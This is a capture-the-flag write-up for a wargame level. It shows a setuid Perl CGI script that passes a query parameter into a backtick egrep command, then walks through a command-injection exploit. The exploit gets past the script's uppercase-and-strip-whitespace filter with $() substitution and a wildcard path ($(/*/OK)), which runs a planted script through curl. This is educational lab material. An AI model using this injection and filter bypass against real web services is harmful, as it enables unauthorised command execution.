# writeup level12

In Level 12, we also have a setuid file, but this time it is a Perl file:

![ls](https://cdn.discordapp.com/attachments/1164485225875783701/1196113484203692162/image.png?ex=65b6727d&is=65a3fd7d&hm=f8144492d8fd37a0fbb618f3febcb154dad577dccf72bf0b90e6e6dd775bce8d&)

cat level12.pl

```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Port 4646 is already in use, so we attempted to connect using `curl -v http://localhost:4646/`  and ouput as this  line `print "Content-type: text/html\n\n";`  and  also retrun `..`.

![connect](https://cdn.discordapp.com/attachments/1164485225875783701/1196380161000611870/image.png?ex=65b76ada&is=65a4f5da&hm=28133ba0944411ff60f36a16e7b4c527dfff436716272896cc5631e16ed9c6e1&)


# Exploit

After reviewing the code, it appears that the line `@output = egrep "^$xx" /tmp/xd 2>&1; ` may be vulnerable to command injection due to the use of backticks (``) for executing a shell command within the Perl script. However, the code also includes a basic filter for the $xx variable in the following lines:
```
$xx = $_[0];
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
```
In these lines, the code extracts the first parameter, converts its characters to uppercase using `tr`, and removes whitespace with a regular expression. As an illustration, if we submit a request like curl `'192.168.1.3:4646/?x=test ok&y=lol'`, the value of `$xx` will be transformed into TESTOK

To exploit this, we can take advantage of `$()` [Command Substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html) in Linux, which replaces what is in `$()` with the output of a command, for example, $(ls) or backticks (``). We can create a script that retrieves the flag and runs it from /tmp, as we have access to create files there.

However, there is a challenge due to the basic filter in the code. For instance, if we have $(/tmp/ok), it is transformed to $(/TMP/OK). To bypass this, we can use the asterisk (*) as a wildcard character. This character will search in our script in all directories in /. Therefore, the exploit can be written as $(/*/OK)

the OK secript
```
#!/bin/bash

getflag > /tmp/lol
```

```chmod +x /tmp/OK```

so we can sent the request curl 'http://192.168.1.3:4646/?x=$(/*/OK)&y=lol' 

![exploit](https://cdn.discordapp.com/attachments/1164485225875783701/1196418085238886461/image.png?ex=65b78e2b&is=65a5192b&hm=04e270ec6d1db1921b186e62d8ed241a70b9a2e662c219d546b783b2581d04af&)





